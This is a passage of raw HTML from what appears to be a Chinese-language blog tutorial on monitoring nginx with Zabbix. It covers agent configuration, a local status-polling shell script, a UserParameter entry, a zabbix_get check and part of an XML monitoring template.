zabbix&#x670D;&#x52A1;&#x5668;ip&#x5730;&#x5740;</span><br><span class=\"line\">ServerActive=zabbix_server_IP  &#x4E3B;&#x52A8;&#x5411;zabbix server&#x53D1;&#x9001;&#x76D1;&#x63A7;&#x5185;&#x5BB9;</span><br><span class=\"line\">Hostname=name  name&#x914D;&#x7F6E;&#x7684;&#x5185;&#x5BB9;&#x8981;&#x548C;zabbix&#x670D;&#x52A1;&#x5668;&#x914D;&#x7F6E;&#x7684;Host name&#x4E00;&#x81F4;</span><br><span class=\"line\">UnsafeUserParameters=1  &#x662F;&#x5426;&#x542F;&#x7528;&#x81EA;&#x5B9A;&#x4E49;key,zabbix&#x76D1;&#x63A7;mysql&#x3001;tomcat&#x7B49;&#x6570;&#x636E;&#x65F6;&#x9700;&#x8981;&#x81EA;&#x5B9A;&#x4E49;key</span><br></pre></td></tr></table></figure></p>\n<p>&#x7F16;&#x5199;&#x5BA2;&#x6237;&#x7AEF;&#x811A;&#x672C;ngx_status.sh, &#x5B58;&#x653E;/etc/zabbix/scripts&#x76EE;&#x5F55;&#xFF0C;&#x5E76;&#x8D4B;&#x4E88;&#x6267;&#x884C;&#x6743;&#x9650;&#x3002;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">HOST=<span class=\"string\">&quot;127.0.0.1&quot;</span></span><br><span class=\"line\">PORT=<span class=\"string\">&quot;80&quot;</span></span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"comment\"># &#x68C0;&#x6D4B;nginx&#x8FDB;&#x7A0B;&#x662F;&#x5426;&#x5B58;&#x5728;</span></span><br><span class=\"line\"><span class=\"keyword\">function</span> ping {</span><br><span class=\"line\">    /sbin/pidof nginx | wc <span class=\"_\">-l</span> </span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"comment\"># &#x68C0;&#x6D4B;nginx&#x6027;&#x80FD;</span></span><br><span class=\"line\"><span class=\"keyword\">function</span> active {</span><br><span class=\"line\">    /usr/bin/curl <span class=\"string\">&quot;http://<span class=\"variable\">$HOST</span>:<span class=\"variable\">$PORT</span>/nginx-status/&quot;</span> 2&gt;/dev/null| grep <span class=\"string\">&apos;Active&apos;</span> | awk <span class=\"string\">&apos;{print $NF}&apos;</span></span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"keyword\">function</span> reading {</span><br><span class=\"line\">    /usr/bin/curl <span class=\"string\">&quot;http://<span class=\"variable\">$HOST</span>:<span class=\"variable\">$PORT</span>/nginx-status/&quot;</span> 2&gt;/dev/null| grep <span class=\"string\">&apos;Reading&apos;</span> | awk <span class=\"string\">&apos;{print $2}&apos;</span></span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"keyword\">function</span> writing {</span><br><span class=\"line\">    /usr/bin/curl <span class=\"string\">&quot;http://<span class=\"variable\">$HOST</span>:<span class=\"variable\">$PORT</span>/nginx-status/&quot;</span> 2&gt;/dev/null| grep <span class=\"string\">&apos;Writing&apos;</span> | awk <span class=\"string\">&apos;{print $4}&apos;</span></span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"keyword\">function</span> waiting {</span><br><span class=\"line\">    /usr/bin/curl <span class=\"string\">&quot;http://<span class=\"variable\">$HOST</span>:<span class=\"variable\">$PORT</span>/nginx-status/&quot;</span> 2&gt;/dev/null| grep <span class=\"string\">&apos;Waiting&apos;</span> | awk <span class=\"string\">&apos;{print $6}&apos;</span></span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"keyword\">function</span> accepts {</span><br><span class=\"line\">    /usr/bin/curl <span class=\"string\">&quot;http://<span class=\"variable\">$HOST</span>:<span class=\"variable\">$PORT</span>/nginx-status/&quot;</span> 2&gt;/dev/null| awk NR==3 | awk <span class=\"string\">&apos;{print $1}&apos;</span></span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"keyword\">function</span> handled {</span><br><span class=\"line\">    /usr/bin/curl <span class=\"string\">&quot;http://<span class=\"variable\">$HOST</span>:<span class=\"variable\">$PORT</span>/nginx-status/&quot;</span> 2&gt;/dev/null| awk NR==3 | awk <span class=\"string\">&apos;{print $2}&apos;</span></span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"keyword\">function</span> requests {</span><br><span class=\"line\">    /usr/bin/curl <span class=\"string\">&quot;http://<span class=\"variable\">$HOST</span>:<span class=\"variable\">$PORT</span>/nginx-status/&quot;</span> 2&gt;/dev/null| awk NR==3 | awk <span class=\"string\">&apos;{print $3}&apos;</span></span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"comment\"># &#x6267;&#x884C;function</span></span><br><span class=\"line\"><span class=\"variable\">$1</span></span><br></pre></td></tr></table></figure></p>\n<p>&#x5C06;&#x81EA;&#x5B9A;&#x4E49;&#x7684;UserParameter&#x52A0;&#x5165;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#xFF0C;&#x7136;&#x540E;&#x91CD;&#x542F;agentd.<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># vim /etc/zabbix/zabbix_agentd.d/userparameter_mysql.conf</span></span><br><span class=\"line\">UserParameter=nginx.status[*],/etc/zabbix/scripts/ngx_status.sh <span class=\"variable\">$1</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#service zabbix-agent restart</span></span><br></pre></td></tr></table></figure></p>\n<h3 id=\"&#x670D;&#x52A1;&#x5668;zabbix-get&#x6570;&#x636E;&#x68C0;&#x6D4B;\"><a href=\"#&#x670D;&#x52A1;&#x5668;zabbix-get&#x6570;&#x636E;&#x68C0;&#x6D4B;\" class=\"headerlink\" title=\"&#x670D;&#x52A1;&#x5668;zabbix_get&#x6570;&#x636E;&#x68C0;&#x6D4B;\"></a>&#x670D;&#x52A1;&#x5668;zabbix_get&#x6570;&#x636E;&#x68C0;&#x6D4B;</h3><p>&#x6B64;&#x6B65;&#x9AA4;&#x53EF;&#x4EE5;&#x8DF3;&#x8FC7;&#xFF0C;&#x4F46;&#x6700;&#x597D;&#x8FD8;&#x662F;&#x6D4B;&#x8BD5;&#x4E00;&#x4E0B;&#xFF0C;&#x901A;&#x8FC7;&#x6B64;&#x547D;&#x4EE4;&#x68C0;&#x6D4B;&#x5BA2;&#x6237;&#x7AEF;&#x914D;&#x7F6E;&#x662F;&#x5426;&#x6B63;&#x786E;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># /usr/bin/zabbix_get -s agentd&#x673A;&#x5668;ip -k &apos;nginx.status[accepts]&apos;</span></span><br><span class=\"line\">9570756</span><br><span class=\"line\"><span class=\"comment\"># /usr/bin/zabbix_get -s agentd&#x673A;&#x5668;ip -k &apos;nginx.status[ping]&apos;</span></span><br><span class=\"line\">1</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"zabbix-web&#x7AEF;&#x914D;&#x7F6E;\"><a href=\"#zabbix-web&#x7AEF;&#x914D;&#x7F6E;\" class=\"headerlink\" title=\"zabbix web&#x7AEF;&#x914D;&#x7F6E;\"></a>zabbix web&#x7AEF;&#x914D;&#x7F6E;</h3><p><strong>&#x5BFC;&#x5165;Template App NGINX&#x6A21;&#x677F;</strong><br>&#x6A21;&#x677F;&#x5DF2;&#x7ECF;&#x5199;&#x597D;&#xFF0C;&#x4F4D;&#x4E8E;&#x6587;&#x7AE0;&#x672B;&#x5C3E;&#x3002;</p>\n<p><strong>Link NGINX&#x6A21;&#x677F;</strong><br>&#x5230;&#x4E86;&#x6700;&#x540E;&#x4E00;&#x4E2A;&#x9636;&#x6BB5;&#xFF0C;&#x767B;&#x9646;zabbix&#x7BA1;&#x7406;&#x7AEF;&#xFF0C;link&#x6A21;&#x677F;&#x5230;nginx&#x670D;&#x52A1;&#x5668;&#xFF1A;configuration-&gt;hosts-&gt;&#x70B9;&#x51FB;nginx&#x6240;&#x5728;&#x670D;&#x52A1;&#x5668;-&gt;&#x70B9;&#x51FB;template-&gt;Link new templates&#x8F93;&#x5165;&#x201D;Template App NGINX&#x201D;-&gt;Add-&gt;&#x6700;&#x540E;&#x70B9;&#x51FB;update&#x3002;</p>\n<p><br></p>\n<hr>\n<h3 id=\"Template-App-NGINX&#x6A21;&#x677F;\"><a href=\"#Template-App-NGINX&#x6A21;&#x677F;\" class=\"headerlink\" title=\"Template App NGINX&#x6A21;&#x677F;\"></a>Template App NGINX&#x6A21;&#x677F;</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br><span class=\"line\">171</span><br><span class=\"line\">172</span><br><span class=\"line\">173</span><br><span class=\"line\">174</span><br><span class=\"line\">175</span><br><span class=\"line\">176</span><br><span class=\"line\">177</span><br><span class=\"line\">178</span><br><span class=\"line\">179</span><br><span class=\"line\">180</span><br><span class=\"line\">181</span><br><span class=\"line\">182</span><br><span class=\"line\">183</span><br><span class=\"line\">184</span><br><span class=\"line\">185</span><br><span class=\"line\">186</span><br><span class=\"line\">187</span><br><span class=\"line\">188</span><br><span class=\"line\">189</span><br><span class=\"line\">190</span><br><span class=\"line\">191</span><br><span class=\"line\">192</span><br><span class=\"line\">193</span><br><span class=\"line\">194</span><br><span class=\"line\">195</span><br><span class=\"line\">196</span><br><span class=\"line\">197</span><br><span class=\"line\">198</span><br><span class=\"line\">199</span><br><span class=\"line\">200</span><br><span class=\"line\">201</span><br><span class=\"line\">202</span><br><span class=\"line\">203</span><br><span class=\"line\">204</span><br><span class=\"line\">205</span><br><span class=\"line\">206</span><br><span class=\"line\">207</span><br><span class=\"line\">208</span><br><span class=\"line\">209</span><br><span class=\"line\">210</span><br><span class=\"line\">211</span><br><span class=\"line\">212</span><br><span class=\"line\">213</span><br><span class=\"line\">214</span><br><span class=\"line\">215</span><br><span class=\"line\">216</span><br><span class=\"line\">217</span><br><span class=\"line\">218</span><br><span class=\"line\">219</span><br><span class=\"line\">220</span><br><span class=\"line\">221</span><br><span class=\"line\">222</span><br><span class=\"line\">223</span><br><span class=\"line\">224</span><br><span class=\"line\">225</span><br><span class=\"line\">226</span><br><span class=\"line\">227</span><br><span class=\"line\">228</span><br><span class=\"line\">229</span><br><span class=\"line\">230</span><br><span class=\"line\">231</span><br><span class=\"line\">232</span><br><span class=\"line\">233</span><br><span class=\"line\">234</span><br><span class=\"line\">235</span><br><span class=\"line\">236</span><br><span class=\"line\">237</span><br><span class=\"line\">238</span><br><span class=\"line\">239</span><br><span class=\"line\">240</span><br><span class=\"line\">241</span><br><span class=\"line\">242</span><br><span class=\"line\">243</span><br><span class=\"line\">244</span><br><span class=\"line\">245</span><br><span class=\"line\">246</span><br><span class=\"line\">247</span><br><span class=\"line\">248</span><br><span class=\"line\">249</span><br><span class=\"line\">250</span><br><span class=\"line\">251</span><br><span class=\"line\">252</span><br><span class=\"line\">253</span><br><span class=\"line\">254</span><br><span class=\"line\">255</span><br><span class=\"line\">256</span><br><span class=\"line\">257</span><br><span class=\"line\">258</span><br><span class=\"line\">259</span><br><span class=\"line\">260</span><br><span class=\"line\">261</span><br><span class=\"line\">262</span><br><span class=\"line\">263</span><br><span class=\"line\">264</span><br><span class=\"line\">265</span><br><span class=\"line\">266</span><br><span class=\"line\">267</span><br><span class=\"line\">268</span><br><span class=\"line\">269</span><br><span class=\"line\">270</span><br><span class=\"line\">271</span><br><span class=\"line\">272</span><br><span class=\"line\">273</span><br><span class=\"line\">274</span><br><span class=\"line\">275</span><br><span class=\"line\">276</span><br><span class=\"line\">277</span><br><span class=\"line\">278</span><br><span class=\"line\">279</span><br><span class=\"line\">280</span><br><span class=\"line\">281</span><br><span class=\"line\">282</span><br><span class=\"line\">283</span><br><span class=\"line\">284</span><br><span class=\"line\">285</span><br><span class=\"line\">286</span><br><span class=\"line\">287</span><br><span class=\"line\">288</span><br><span class=\"line\">289</span><br><span class=\"line\">290</span><br><span class=\"line\">291</span><br><span class=\"line\">292</span><br><span class=\"line\">293</span><br><span class=\"line\">294</span><br><span class=\"line\">295</span><br><span class=\"line\">296</span><br><span class=\"line\">297</span><br><span class=\"line\">298</span><br><span class=\"line\">299</span><br><span class=\"line\">300</span><br><span class=\"line\">301</span><br><span class=\"line\">302</span><br><span class=\"line\">303</span><br><span class=\"line\">304</span><br><span class=\"line\">305</span><br><span class=\"line\">306</span><br><span class=\"line\">307</span><br><span class=\"line\">308</span><br><span class=\"line\">309</span><br><span class=\"line\">310</span><br><span class=\"line\">311</span><br><span class=\"line\">312</span><br><span class=\"line\">313</span><br><span class=\"line\">314</span><br><span class=\"line\">315</span><br><span class=\"line\">316</span><br><span class=\"line\">317</span><br><span class=\"line\">318</span><br><span class=\"line\">319</span><br><span class=\"line\">320</span><br><span class=\"line\">321</span><br><span class=\"line\">322</span><br><span class=\"line\">323</span><br><span class=\"line\">324</span><br><span class=\"line\">325</span><br><span class=\"line\">326</span><br><span class=\"line\">327</span><br><span class=\"line\">328</span><br><span class=\"line\">329</span><br><span class=\"line\">330</span><br><span class=\"line\">331</span><br><span class=\"line\">332</span><br><span class=\"line\">333</span><br><span class=\"line\">334</span><br><span class=\"line\">335</span><br><span class=\"line\">336</span><br><span class=\"line\">337</span><br><span class=\"line\">338</span><br><span class=\"line\">339</span><br><span class=\"line\">340</span><br><span class=\"line\">341</span><br><span class=\"line\">342</span><br><span class=\"line\">343</span><br><span class=\"line\">344</span><br><span class=\"line\">345</span><br><span class=\"line\">346</span><br><span class=\"line\">347</span><br><span class=\"line\">348</span><br><span class=\"line\">349</span><br><span class=\"line\">350</span><br><span class=\"line\">351</span><br><span class=\"line\">352</span><br><span class=\"line\">353</span><br><span class=\"line\">354</span><br><span class=\"line\">355</span><br><span class=\"line\">356</span><br><span class=\"line\">357</span><br><span class=\"line\">358</span><br><span class=\"line\">359</span><br><span class=\"line\">360</span><br><span class=\"line\">361</span><br><span class=\"line\">362</span><br><span class=\"line\">363</span><br><span class=\"line\">364</span><br><span class=\"line\">365</span><br><span class=\"line\">366</span><br><span class=\"line\">367</span><br><span class=\"line\">368</span><br><span class=\"line\">369</span><br><span class=\"line\">370</span><br><span class=\"line\">371</span><br><span class=\"line\">372</span><br><span class=\"line\">373</span><br><span class=\"line\">374</span><br><span class=\"line\">375</span><br><span class=\"line\">376</span><br><span class=\"line\">377</span><br><span class=\"line\">378</span><br><span class=\"line\">379</span><br><span class=\"line\">380</span><br><span class=\"line\">381</span><br><span class=\"line\">382</span><br><span class=\"line\">383</span><br><span class=\"line\">384</span><br><span class=\"line\">385</span><br><span class=\"line\">386</span><br><span class=\"line\">387</span><br><span class=\"line\">388</span><br><span class=\"line\">389</span><br><span class=\"line\">390</span><br><span class=\"line\">391</span><br><span class=\"line\">392</span><br><span class=\"line\">393</span><br><span class=\"line\">394</span><br><span class=\"line\">395</span><br><span class=\"line\">396</span><br><span class=\"line\">397</span><br><span class=\"line\">398</span><br><span class=\"line\">399</span><br><span class=\"line\">400</span><br><span class=\"line\">401</span><br><span class=\"line\">402</span><br><span class=\"line\">403</span><br><span class=\"line\">404</span><br><span class=\"line\">405</span><br><span class=\"line\">406</span><br><span class=\"line\">407</span><br><span class=\"line\">408</span><br><span class=\"line\">409</span><br><span class=\"line\">410</span><br><span class=\"line\">411</span><br><span class=\"line\">412</span><br><span class=\"line\">413</span><br><span class=\"line\">414</span><br><span class=\"line\">415</span><br><span class=\"line\">416</span><br><span class=\"line\">417</span><br><span class=\"line\">418</span><br><span class=\"line\">419</span><br><span class=\"line\">420</span><br><span class=\"line\">421</span><br><span class=\"line\">422</span><br><span class=\"line\">423</span><br><span class=\"line\">424</span><br><span class=\"line\">425</span><br><span class=\"line\">426</span><br><span class=\"line\">427</span><br><span class=\"line\">428</span><br><span class=\"line\">429</span><br><span class=\"line\">430</span><br><span class=\"line\">431</span><br><span class=\"line\">432</span><br><span class=\"line\">433</span><br><span class=\"line\">434</span><br><span class=\"line\">435</span><br><span class=\"line\">436</span><br><span class=\"line\">437</span><br><span class=\"line\">438</span><br><span class=\"line\">439</span><br><span class=\"line\">440</span><br><span class=\"line\">441</span><br><span class=\"line\">442</span><br><span class=\"line\">443</span><br><span class=\"line\">444</span><br><span class=\"line\">445</span><br><span class=\"line\">446</span><br><span class=\"line\">447</span><br><span class=\"line\">448</span><br><span class=\"line\">449</span><br><span class=\"line\">450</span><br><span class=\"line\">451</span><br><span class=\"line\">452</span><br><span class=\"line\">453</span><br><span class=\"line\">454</span><br><span class=\"line\">455</span><br><span class=\"line\">456</span><br><span class=\"line\">457</span><br><span class=\"line\">458</span><br><span class=\"line\">459</span><br><span class=\"line\">460</span><br><span class=\"line\">461</span><br><span class=\"line\">462</span><br><span class=\"line\">463</span><br><span class=\"line\">464</span><br><span class=\"line\">465</span><br><span class=\"line\">466</span><br><span class=\"line\">467</span><br><span class=\"line\">468</span><br><span class=\"line\">469</span><br><span class=\"line\">470</span><br><span class=\"line\">471</span><br><span class=\"line\">472</span><br><span class=\"line\">473</span><br><span class=\"line\">474</span><br><span class=\"line\">475</span><br><span class=\"line\">476</span><br><span class=\"line\">477</span><br><span class=\"line\">478</span><br><span class=\"line\">479</span><br><span class=\"line\">480</span><br><span class=\"line\">481</span><br><span class=\"line\">482</span><br><span class=\"line\">483</span><br><span class=\"line\">484</span><br><span class=\"line\">485</span><br><span class=\"line\">486</span><br><span class=\"line\">487</span><br><span class=\"line\">488</span><br><span class=\"line\">489</span><br><span class=\"line\">490</span><br><span class=\"line\">491</span><br><span class=\"line\">492</span><br><span class=\"line\">493</span><br><span class=\"line\">494</span><br><span class=\"line\">495</span><br><span class=\"line\">496</span><br><span class=\"line\">497</span><br><span class=\"line\">498</span><br><span class=\"line\">499</span><br><span class=\"line\">500</span><br><span class=\"line\">501</span><br><span class=\"line\">502</span><br><span class=\"line\">503</span><br><span class=\"line\">504</span><br><span class=\"line\">505</span><br><span class=\"line\">506</span><br><span class=\"line\">507</span><br><span class=\"line\">508</span><br><span class=\"line\">509</span><br><span class=\"line\">510</span><br><span class=\"line\">511</span><br><span class=\"line\">512</span><br><span class=\"line\">513</span><br><span class=\"line\">514</span><br><span class=\"line\">515</span><br><span class=\"line\">516</span><br><span class=\"line\">517</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?xml version=<span class=\"string\">&quot;1.0&quot;</span> encoding=<span class=\"string\">&quot;UTF-8&quot;</span>?&gt;</span><br><span class=\"line\">&lt;zabbix_<span class=\"built_in\">export</span>&gt;</span><br><span class=\"line\">    &lt;version&gt;2.0&lt;/version&gt;</span><br><span class=\"line\">    &lt;date&gt;2016-10-6T01:29:50Z&lt;/date&gt;</span><br><span class=\"line\">    &lt;groups&gt;</span><br><span class=\"line\">        &lt;group&gt;</span><br><span class=\"line\">            &lt;name&gt;Templates&lt;/name&gt;</span><br><span class=\"line\">        &lt;/group&gt;</span><br><span class=\"line\">    &lt;/groups&gt;</span><br><span class=\"line\">    &lt;templates&gt;</span><br><span class=\"line\">        &lt;template&gt;</span><br><span class=\"line\">            &lt;template&gt;Template App NGINX&lt;/template&gt;</span><br><span class=\"line\">            &lt;name&gt;Template App NGINX&lt;/name&gt;</span><br><span class=\"line\">            &lt;description&gt;&lt;/description&gt;</span><br><span class=\"line\">            &lt;groups&gt;</span><br><span class=\"line\">                &lt;group&gt;</span><br><span class=\"line\">                    &lt;name&gt;Templates&lt;/name&gt;</span><br><span class=\"line\">                &lt;/group&gt;</span><br><span class=\"line\">            &lt;/groups&gt;</span><br><span class=\"line\">            &lt;applications&gt;</span><br><span class=\"line\">                &lt;application&gt;</span><br><span class=\"line\">                    &lt;name&gt;nginx&lt;/name&gt;</span><br><span class=\"line\">                &lt;/application&gt;</span><br><span class=\"line\">            &lt;/applications&gt;</span><br><span class=\"line\">            &lt;items&gt;</span><br><span class=\"line\">                &lt;item&gt;</span><br><span class=\"line\">                    &lt;name&gt;nginx status connections active&lt;/name&gt;</span><br><span class=\"line\">                    &lt;<span class=\"built_in\">type</span>&gt;0&lt;/<span class=\"built_in\">type</span>&gt;</span><br><span class=\"line\">                    &lt;snmp_community/&gt;</span><br><span class=\"line\">                    &lt;multiplier&gt;0&lt;/multiplier&gt;</span><br><span class=\"line\">                    &lt;snmp_oid/&gt;</span><br><span class=\"line\">                    &lt;key&gt;nginx.status[active]&lt;/key&gt;</span><br><span class=\"line\">                    &lt;delay&gt;60&lt;/delay&gt;</span><br><span class=\"line\">                    &lt;<span class=\"built_in\">history</span>&gt;90&lt;/<span class=\"built_in\">history</span>&gt;</span><br><span class=\"line\">                    &lt;trends&gt;365&lt;/trends&gt;</span><br><span class=\"line\">                    &lt;status&gt;0&lt;/status&gt;</span><br><span class=\"line\">                    &lt;value_<span class=\"built_in\">type</span>&gt;3&lt;/value_<span class=\"built_in\">type</span>&gt;</span><br><span class=\"line\">                    &lt;allowed_hosts/&gt;</span><br><span class=\"line\">                    &lt;units/&gt;</span><br><span class=\"line\">                    &lt;delta&gt;0&lt;/delta&gt;</span><br><span class=\"line\">                    &lt;snmpv3_contextname/&gt;</span><br><span class=\"line\">                    &lt;snmpv3_securityname/&gt;</span><br><span class=\"line\">                    &lt;snmpv3_securitylevel&gt;0&lt;/snmpv3_securitylevel&gt;</span><br><span class=\"line\">                    &lt;snmpv3_authprotocol&gt;0&lt;/snmpv3_authprotocol&gt;</span><br><span class=\"line\">                    &lt;snmpv3_authpassphrase/&gt;</span><br><span class=\"line\">                    &lt;snmpv3_privprotocol&gt;0&lt;/snmpv3_privprotocol&gt;</span><br><span class=\"line\">                    &lt;snmpv3_privpassphrase/&gt;</span><br><span class=\"line\">                    &lt;formula&gt;1&lt;/formula&gt;</span><br><span class=\"line\">                    &lt;delay_flex/&gt;</span><br><span class=\"line\">                    &lt;params/&gt;</span><br><span class=\"line\">                    &lt;ipmi_sensor/&gt;</span><br><span class=\"line\">                    &lt;data_<span class=\"built_in\">type</span>&gt;0&lt;/data_<span class=\"built_in\">type</span>&gt;</span><br><span class=\"line\">                    &lt;authtype&gt;0&lt;/authtype&gt;</span><br><span class=\"line\">                    &lt;username/&gt;</span><br><span class=\"line\">                    &lt;password/&gt;</span><br><span class=\"line\">                    &lt;publickey/&gt;</span><br><span class=\"line\">                    &lt;privatekey/&gt;</span><br><span class=\"line\">                    &lt;port/&gt;</span><br><span class=\"line\">                    &lt;description&gt;active&lt;/description&gt;</span><br><span class=\"line\">                    &lt;inventory_link&gt;0&lt;/inventory_link&gt;</span><br><span class=\"line\">                    &lt;applications&gt;</span><br><span class=\"line\">                        &lt;application&gt;</span><br><span class=\"line\">                            &lt;name&gt;nginx&lt;/name&gt;</span><br><span class=\"line\">                        &lt;/application&gt;</span><br><span class=\"line\">                    &lt;/applications&gt;</span><br><span class=\"line\">                    &lt;valuemap/&gt;</span><br><span class=\"line\">                    &lt;logtimefmt/&gt;</span><br><span class=\"line\">                &lt;/item&gt;</span><br><span class=\"line\">                &lt;item&gt;</span><br><span class=\"line\">                    &lt;name&gt;nginx status connections reading&lt;/name&gt;</span><br><span class=\"line\">                    &lt;<span class=\"built_in\">type</span>&gt;0&lt;/<span class=\"built_in\">type</span>&gt;</span><br><span class=\"line\">                    &lt;snmp_community/&gt;</span><br><span class=\"line\">                    &lt;multiplier&gt;0&lt;/multiplier&gt;</span><br><span class=\"line\">                    &lt;snmp_oid/&gt;</span><br><span class=\"line\">                    &lt;key&gt;nginx.status[reading]&lt;/key&gt;</span><br><span class=\"line\">                    &lt;delay&gt;60&lt;/delay&gt;</span><br><span class=\"line\">                    &lt;<span class=\"built_in\">history</span>&gt;90&lt;/<span class=\"built_in\">history</span>&gt;</span><br><span class=\"line\">                    &lt;trends&gt;365&lt;/trends&gt;</span><br><span class=\"line\">                    &lt;status&gt;0&lt;/status&gt;</span><br><span class=\"line\">                    &lt;value_<span class=\"built_in\">type</span>&gt;3&lt;/value_<span 